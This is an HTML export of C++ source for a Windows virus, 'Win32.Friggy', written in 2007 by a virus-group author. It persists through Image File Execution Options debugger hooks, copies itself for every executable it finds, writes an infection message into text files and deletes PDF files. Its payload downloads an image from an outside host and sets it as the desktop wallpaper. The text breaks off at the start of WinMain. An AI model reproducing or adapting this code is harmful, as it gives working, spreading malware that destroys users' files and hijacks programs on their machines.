<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=UTF-8">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc12 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">//http://en.wikipedia.org/wiki/Frigg 
</span><span class="sc1">/*
Name:Win32.Friggy - by free0n [doomriderz]
free0n.host.sk | doomriderz.co.nr
Date:02/02/2007
Desc: Hooks notepad, then whenever/where ever notepad is 
ran it finds other exe's and hooks them too.
Also leaves a message in text files it finds
and then deletes pdf documents.

Payload is a download function that downloads a skull
image from some jerks site and then sets it as
the background image. Once the user restarts they
see the new image as their background 
should be annonying enough :) Why no mass mailing?
or irc spreading? cause it's been done to death and
we all can do better then that!

Why write this? Well mostly for personal learning
the other was to show some examples of how to do
hook exe using the image hook in the registy. It's an
old ass trick so I no way claim this is mine
and really just wanted to write one for fun and
learning.

Compile with BloodShed DevC++
Bloodshed it's what real men use!
*/</span><span class="sc0">
</span><span class="sc9">#include &lt;windows.h&gt;
#include &lt;iostream&gt;
#include &lt;string&gt; 
#include &lt;fstream&gt;
#include &lt;shlobj.h&gt;
#include &lt;tlhelp32.h&gt;
#include &lt;stdlib.h&gt;
</span><span class="sc0">
</span><span class="sc5">using</span><span class="sc0"> </span><span class="sc5">namespace</span><span class="sc0"> </span><span class="sc11">std</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">key</span><span class="sc10">[</span><span class="sc4">75</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc12">"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">appName</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"notepad.exe"</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">windir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">],</span><span class="sc11">winbkup</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">];</span><span class="sc0">
</span><span class="sc11">SYSTEMTIME</span><span class="sc0"> </span><span class="sc11">st</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rnd</span><span class="sc10">[</span><span class="sc4">6</span><span class="sc10">];</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">split</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">sep</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">fi</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">sec</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">str</span><span class="sc10">.</span><span class="sc11">find</span><span class="sc10">(</span><span class="sc11">sep</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">str</span><span class="sc10">.</span><span class="sc11">empty</span><span class="sc10">())</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0">
           </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">++];</span><span class="sc0"> 
           </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">+(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc11">sep</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">();</span><span class="sc0"> 
           </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">())</span><span class="sc0">
           </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">sec</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">++];</span><span class="sc0"> 
           </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc5">else</span><span class="sc0">
     </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">fi</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">str</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">sec</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"NULL"</span><span class="sc10">;</span><span class="sc0"> 
     </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
 
</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">n</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">ifstream</span><span class="sc0"> </span><span class="sc11">friggfile</span><span class="sc10">(</span><span class="sc11">n</span><span class="sc10">.</span><span class="sc11">c_str</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">friggfile</span><span class="sc10">.</span><span class="sc11">is_open</span><span class="sc10">();</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">ReplaceAll</span><span class="sc10">(</span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc0"> </span><span class="sc11">txt</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">find</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">string</span><span class="sc10">::</span><span class="sc11">npos</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">erase</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">insert</span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc11">r</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">txt</span><span class="sc10">.</span><span class="sc11">find</span><span class="sc10">(</span><span class="sc11">s</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">r</span><span class="sc10">.</span><span class="sc11">length</span><span class="sc10">());</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">txt</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">Hook</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">regPath</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//creates the registry hoook, the two params
</span><span class="sc0">    </span><span class="sc2">//we pass in is the path to the executable and the 
</span><span class="sc0">    </span><span class="sc2">//regpath to the image hook, we then create the debugger
</span><span class="sc0">    </span><span class="sc2">//and throw it in
</span><span class="sc0">    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">hooked</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">regPath</span><span class="sc10">,&amp;</span><span class="sc11">hKey</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc6">"Debugger"</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">REG_SZ</span><span class="sc10">,(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">path</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">path</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">hooked</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">hooked</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">UnHook</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">regPath</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//deletes the key
</span><span class="sc0">    </span><span class="sc11">RegDeleteKey</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">regPath</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">HookExists</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc10">*</span><span class="sc0"> </span><span class="sc11">regPath</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//basic check to see if the hook exists 
</span><span class="sc0">    </span><span class="sc2">//regPath will contain a registry path for the hook...
</span><span class="sc0">    </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0">        
    </span><span class="sc16">bool</span><span class="sc0"> </span><span class="sc11">keyExists</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">RegOpenKeyEx</span><span class="sc10">(</span><span class="sc11">HKEY_LOCAL_MACHINE</span><span class="sc10">,</span><span class="sc11">regPath</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc11">KEY_QUERY_VALUE</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">ERROR_SUCCESS</span><span class="sc10">)</span><span class="sc0">
    </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">keyExists</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">true</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">keyExists</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InfectFiles</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
     </span><span class="sc2">//scan for our files to infect
</span><span class="sc0">     </span><span class="sc2">//and hook. This is pretty much your basic
</span><span class="sc0">     </span><span class="sc2">//file search in current directory. 
</span><span class="sc0">     </span><span class="sc2">//One thing to note about the hook is that the 
</span><span class="sc0">     </span><span class="sc2">//directory will change anywhere for example notepad
</span><span class="sc0">     </span><span class="sc2">//is opened up so we will always find new files...
</span><span class="sc0">     
     </span><span class="sc11">WIN32_FIND_DATA</span><span class="sc0"> </span><span class="sc11">FindFileData</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">HANDLE</span><span class="sc0"> </span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">INVALID_HANDLE_VALUE</span><span class="sc10">;</span><span class="sc0">
     </span><span class="sc11">hFind</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">FindFirstFile</span><span class="sc10">(</span><span class="sc6">"*.*"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">FindFileData</span><span class="sc10">);</span><span class="sc0">
     </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">FindNextFile</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">,&amp;</span><span class="sc11">FindFileData</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> 
     </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">dwFileAttributes</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">FILE_ATTRIBUTE_DIRECTORY</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">))</span><span class="sc0"> 
          </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc2">//create a new hook to a new copy of friggy for every exe we find
</span><span class="sc0">             </span><span class="sc2">//this could get rather large
</span><span class="sc0">             </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">"Friggy"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">rkey</span><span class="sc10">[</span><span class="sc4">75</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc12">"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\";
</span><span class="sc0">                </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">rkey</span><span class="sc10">,</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
             
                </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">HookExists</span><span class="sc10">(</span><span class="sc11">rkey</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
                   </span><span class="sc11">GetWindowsDirectory</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc5">sizeof</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">windir</span><span class="sc10">));</span><span class="sc0">
                   </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">windir</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc6">"\System\Friggy"</span><span class="sc10">);</span><span class="sc0">
    
                   </span><span class="sc11">GetSystemTime</span><span class="sc10">(&amp;</span><span class="sc11">st</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">srand</span><span class="sc10">(</span><span class="sc11">st</span><span class="sc10">.</span><span class="sc11">wSecond</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">itoa</span><span class="sc10">(</span><span class="sc11">rand</span><span class="sc10">(),</span><span class="sc11">rnd</span><span class="sc10">,</span><span class="sc4">10</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">rnd</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc6">".exe"</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
                   </span><span class="sc11">Hook</span><span class="sc10">(</span><span class="sc11">winbkup</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">rkey</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0"> 
          </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">".txt"</span><span class="sc10">))</span><span class="sc0"> 
          </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc2">//lets append some text to the txt document
</span><span class="sc0">             </span><span class="sc2">//i don't care if we already did it to the same file
</span><span class="sc0">             </span><span class="sc2">//should be funny...
</span><span class="sc0">             </span><span class="sc11">ofstream</span><span class="sc0"> </span><span class="sc11">vfile</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc11">ios</span><span class="sc10">::</span><span class="sc11">app</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">vfile</span><span class="sc10">.</span><span class="sc11">is_open</span><span class="sc10">())</span><span class="sc0"> 
             </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">vfile</span><span class="sc10">&lt;&lt;</span><span class="sc6">"nInfected with Friggy by free0n - [DoomRiderz]n"</span><span class="sc10">;</span><span class="sc0">          
                </span><span class="sc11">vfile</span><span class="sc10">.</span><span class="sc11">close</span><span class="sc10">();</span><span class="sc0">                          
             </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">strstr</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">,</span><span class="sc6">".pdf"</span><span class="sc10">))</span><span class="sc0"> 
          </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc2">//DIE PDF DIEEEE! 
</span><span class="sc0">             </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc11">FindFileData</span><span class="sc10">.</span><span class="sc11">cFileName</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
     </span><span class="sc10">}</span><span class="sc0"> 
     </span><span class="sc11">FindClose</span><span class="sc10">(</span><span class="sc11">hFind</span><span class="sc10">);</span><span class="sc0">                 
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Payload</span><span class="sc10">()</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//payload basically downloads the bitmap image
</span><span class="sc0">    </span><span class="sc2">//from the site below then copies it to the windows
</span><span class="sc0">    </span><span class="sc2">//directory as skull.bmp
</span><span class="sc0">    </span><span class="sc2">//aftwards it sets the background to the image we copied to the windows
</span><span class="sc0">    </span><span class="sc2">//directory and then deletes the file we download in the current
</span><span class="sc0">    </span><span class="sc2">//directory. easy cheezy ;)
</span><span class="sc0">    </span><span class="sc5">typedef</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">URLDownloadToFileA</span><span class="sc10">)(</span><span class="sc16">void</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc16">char</span><span class="sc10">*,</span><span class="sc11">DWORD</span><span class="sc10">,</span><span class="sc16">void</span><span class="sc10">*);</span><span class="sc0">
    </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">LibHnd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">LoadLibrary</span><span class="sc10">(</span><span class="sc6">"Urlmon.dll"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">URLDownloadToFileA</span><span class="sc0"> </span><span class="sc11">URLDownloadToFile</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc10">(</span><span class="sc11">URLDownloadToFileA</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">GetProcAddress</span><span class="sc10">(</span><span class="sc11">LibHnd</span><span class="sc10">,</span><span class="sc6">"URLDownloadToFileA"</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">URLDownloadToFile</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"http://hometown.aol.com/bonednc/images/@skull.bmp"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"skull.bmp"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
    
    </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc6">"skull.bmp"</span><span class="sc10">))</span><span class="sc0"> 
    </span><span class="sc10">{</span><span class="sc0">
       </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">winDir</span><span class="sc10">[</span><span class="sc11">MAX_PATH</span><span class="sc10">]=</span><span class="sc6">""</span><span class="sc10">;</span><span class="sc0">
       </span><span class="sc11">GetWindowsDirectory</span><span class="sc10">(</span><span class="sc11">winDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_PATH</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc11">strcat</span><span class="sc10">(</span><span class="sc11">winDir</span><span class="sc10">,</span><span class="sc6">"\skull.bmp"</span><span class="sc10">);</span><span class="sc0">
       
       </span><span class="sc11">CopyFile</span><span class="sc10">(</span><span class="sc6">"skull.bmp"</span><span class="sc10">,</span><span class="sc11">winDir</span><span class="sc10">,</span><span class="sc11">TRUE</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">FileExists</span><span class="sc10">(</span><span class="sc11">winDir</span><span class="sc10">))</span><span class="sc0"> 
       </span><span class="sc10">{</span><span class="sc0">
          </span><span class="sc11">HKEY</span><span class="sc0"> </span><span class="sc11">hKey</span><span class="sc10">;</span><span class="sc0"> 
          </span><span class="sc11">RegCreateKey</span><span class="sc10">(</span><span class="sc11">HKEY_CURRENT_USER</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Control Panel\Desktop"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"Wallpaper"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc11">winDir</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc11">winDir</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">RegSetValueEx</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc6">"TileWallpaper"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">REG_SZ</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BYTE</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc6">"1"</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">lstrlen</span><span class="sc10">(</span><span class="sc6">"1"</span><span class="sc10">)+</span><span class="sc4">1</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc11">RegCloseKey</span><span class="sc10">(</span><span class="sc11">hKey</span><span class="sc10">);</span><span class="sc0">                                                                          
       </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc11">DeleteFile</span><span class="sc10">(</span><span class="sc6">"skull.bmp"</span><span class="sc10">);</span><span class="sc0">                            
    </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">APIENTRY</span><span class="sc0"> </span><span class="sc11">WinMain</span><span class="sc10">(</span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">HINSTANCE</span><span class="sc0"> </span><span class="sc11">hPrevInstance</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">LPSTR</span><span class="sc0"> </span><span class="sc11">lpCmdLine</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">nCmdShow</span><span class="sc10">)</span><span class="sc0">
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//grab the current file
